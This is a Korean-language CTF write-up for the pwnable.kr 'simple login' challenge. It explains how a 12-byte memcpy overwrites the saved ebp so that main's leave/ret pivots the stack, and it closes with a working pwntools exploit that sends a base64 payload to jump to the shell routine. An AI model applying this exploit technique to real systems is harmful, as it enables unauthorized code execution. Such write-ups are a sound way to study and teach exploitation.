---
sort: 3
---

# simple login

```tip
그림이 작아서 잘 안보이면 그림을 새창에서 여세요.
```

login 바이너리를 다운받자.<br><br>
login 바이너리는 32bit이기 때문에 64bit 라이브러리를 사용할 수 없다.<br>
libssl1.0.0이 없다고 login 바이너리가 실행이 되지 않을경우, 아래 명령어를 통해 32bit ssl라이브러리를 설치해주자.

```bash
sudo apt-get install libssl1.0.0:i386
```

<img src="/picture/pwnable.kr/login_1.png" width="1000"/>

main함수에서 사용자의 input을 받은 후에 base64 decode를 하고 평문의 길이가 12byte이하면 auth함수를 호출한다.<br>
Base64Decode는 md5 calculator 문제에서 나온거랑 거의 비슷하게 생겨서 따로 언급은 안하고 넘어가겠다.<br>
참고로 auth함수 호출 전에 사용자의 input이 복사되는 변수 input은 전역변수이다.<br><br>

<img src="/picture/pwnable.kr/login_2.png" width="1000"/>

auth함수가 골때리는데, 사용자의 input의 평문을 가지고 md5 hash값을 도출해내야하는데, 사용자 input 박는 위치랑 md5 만들어내는 함수에 전달하는 buffer의 위치가 다르다. 즉, 사용자의 input으로 뭘 넣든간에, 사용자의 input은 hash값을 만들어내는데 전혀 일조를 하지 않는다는 것이다.<br><br>

<img src="/picture/pwnable.kr/login_4.png" width="1000"/>

사용자의 input이 복사되는 부분을 살펴보니 memcpy를 하기 전에 eax를 0xc만큼 더하는 것을 볼 수 있다.<br>
따라서 ebp-0x8부분에서 0xc만큼 복사가 이루어지니, auth함수의 saved ebp가 조져진다.<br><br>
saved ebp를 조질 수 있다는 것은, main 함수의 ebp가 조져진다는 것이고, main함수의 마지막부분의 `leave`, `ret`를 통해 esp를 조지고 최종적으로 프로그램의 흐름까지 조져버릴 수 있다는 것을 의미한다.<br><br>

<img src="/picture/pwnable.kr/login_3.png" width="1000"/>

correct함수 내에 shell 실행 루틴이 존재한다.<br>
따라서 아래와 같이 payload를 구성하면 된다.

```python
from pwn import *
import base64

p = remote("pwnable.kr", 9003)
p.recvuntil("Authenticate : ")

# correct함수 내의 shell 실행 루틴
system = 0x08049284
# 전역변수 input 주소
ebp = 0x0811eb40

payload = b"AAAA" + p32(system) + p32(ebp)
base64_payload = base64.b64encode(payload)

p.sendline(base64_payload)

p.interactive()
```



```tip
## 알게 된 점

음..... 딱히...?
```